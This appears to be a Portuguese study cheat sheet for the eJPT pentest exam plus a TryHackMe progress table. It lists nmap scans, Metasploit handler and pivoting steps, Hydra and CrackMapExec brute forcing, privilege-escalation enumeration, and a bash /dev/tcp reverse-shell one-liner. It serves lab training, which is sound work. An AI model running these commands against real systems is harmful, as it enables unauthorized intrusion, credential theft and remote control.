# 🧠 eJPT Cheat Sheet

---

## 🔍 Nmap

```bash
# Scan inicial
nmap -Pn -T4 -F <IP>

# Scan completo
nmap -Pn -p- -T4 <IP>

# Serviços + scripts
nmap -sC -sV -p <PORTAS> <IP>

# Completo agressivo
nmap -Pn -A -v <IP>

# Output
nmap -oN scan.txt -oX scan.xml <IP>
```

---

## 💣 Metasploit

```bash
use exploit/multi/handler              # fazer shell dentro do msfconsole
use post/multi/manage/shell_to_meterpreter   # melhorar a shell
use post/multi/recon/local_exploit_suggester # sugestão para exploit local
```

---

## 🐍 Shell Upgrade

```bash
# Python 3
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Python 2
python -c 'import pty; pty.spawn("/bin/sh")'

# Alternativo
python -c 'import os; os.system("/bin/bash")'
```

```bash
export TERM=xterm
stty rows 40 columns 120
```

---

## 🔐 Privilege Escalation

```bash
whoami
id
uname -a
cat /etc/os-release
cat /etc/crontab
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
ps aux | grep root
```

---

## 🌐 Web / Arquivos

# Prestar atenção em arquivos de backup e variações

```
.bak
.old
.save
.zip
.tar
```

Exemplos:
```
wp-config.php.bak
config.old
backup.sql
```

---

## 📥 Wget (Mirror)

```bash
wget -r -np -nH --cut-dirs=1 <URL>   # baixar arquivos em modo mirror
```

---

## 🧾 SMB

```bash
smbclient -L //<IP> -N
smbclient //<IP>/share -N
```

```bash
while read -r share; do 
  echo "Testing share: $share"
  smbclient "//target.ine.local/$share" -N -c "ls" &>/dev/null && \
  echo "[+] Successfully accessed share: $share"
done < /root/Desktop/wordlists/shares.txt
```
---

## 🔓 Brute Force / Enumeração Ativa

### 💣 Hydra

```bash
# SSH
hydra -l <user> -P wordlist.txt ssh://<IP>

# FTP
hydra -l <user> -P wordlist.txt ftp://<IP>

# HTTP POST login
hydra -l <user> -P wordlist.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

---

### 🧨 CrackMapExec

```bash
# SMB brute force
crackmapexec smb <IP> -u users.txt -p passwords.txt

# Validar credenciais
crackmapexec smb <IP> -u <user> -p <pass>

# Executar comando
crackmapexec smb <IP> -u <user> -p <pass> -x "whoami"
```

---

### 🚀 FFUF

```bash
# Descoberta de diretórios
ffuf -u http://<IP>/FUZZ -w wordlist.txt

# Extensões
ffuf -u http://<IP>/FUZZ -w wordlist.txt -e .php,.txt,.bak

# Virtual hosts
ffuf -u http://<IP> -H "Host: FUZZ.<domain>" -w wordlist.txt

# Filtrar por tamanho
ffuf -u http://<IP>/FUZZ -w wordlist.txt -fs 0
```


---

## 🔄 Pivoting

_Existe mais de um IP na rede DMZ e talvez seja exatamente por isso que seja necessário realizar o pivoteamento._

_Dentro da DMZ tem mais de uma máquina, mas aparentemente só tem uma máquina que tem comunicação com a rede interna, preciso descobrir qual é e fazer o pivot o quanto antes._

_Para realizar o pivoteamento o melhor cenário é o MSF Routing usando MSF autoroute + portfwd_

```bash
ip a
route -n
```

```bash
run autoroute -s <REDE>
portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <IP>
```

---

## 📊 Organização

_No momento que a prova iniciar é importante que tenha uma planilha com os seguintes tópicos_

| Nome do host | IP | Serviços | Credenciais | Vulnerabilidades | Observações |
|--------------|----|----------|-------------|------------------|-------------|

---

## 🧠 Enumeração

_Não ignore os outputs do NMAP ou dos outros scanners como SMBmap, crackmapexec ou enum4linux..._

_As creds podem ser reutilizadas em diversos serviços (ex: SMB → RDP)_

_Isso indica ambiente híbrido (Linux + Windows)_

Ferramentas:
- smbmap
- crackmapexec
- enum4linux

---

## 🚨 Dicas Importantes

- Verificar `/etc/hosts`
- Observar banners de serviços e protocolos (podem conter dicas ou flags)
- Testar credenciais em TODOS os serviços
- Procurar:
  - backups
  - configs
  - logs

---

## 🏁 Flags

_Aparentemente as perguntas te guiam para onde estão as flags_

Formato:
```
FLAG{hashMD5}
```

Exemplo:
```
FLAG1{23c7d4bababf8048c0cda5136ac83c9e}
```

✔ Enviar apenas:
```
23c7d4bababf8048c0cda5136ac83c9e
```

---

## ⚡ Extras

```bash
# Transferência de arquivos
python3 -m http.server 8000
```

```bash
# Reverse shell
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```


# 🧠 TryHackMe - Controle de Estudos

---

## 📊 Progresso das Máquinas

| Máquina         | Tipo       | Dificuldade | Status | 
|-----------------|------------|-------------|--------|
| Ignite          | Web        | Easy        | 🟩     |
| Startup         | Linux      | Easy        | 🟩     |
| RootMe          | Web        | Easy        | ⬜     |
| Blog WordPress  | Web        | Easy        | ⬜     |
| Blue            | Windows    | Easy        | 🟩     |
| Blueprint       | Windows    | Easy        | ⬜     |

---

## ✅ Legenda

- ⬜ Não iniciado
- 🟨 Em andamento
- 🟩 Concluído

---

## 🧠 Notas Gerais

- Reutilizar credenciais entre serviços
- Focar em enumeração antes de explorar
- Testar sempre SMB, HTTP e FTP
- Procurar arquivos de backup (.bak, .old, .save)
- Observar banners e versões
- Documentar tudo durante o processo

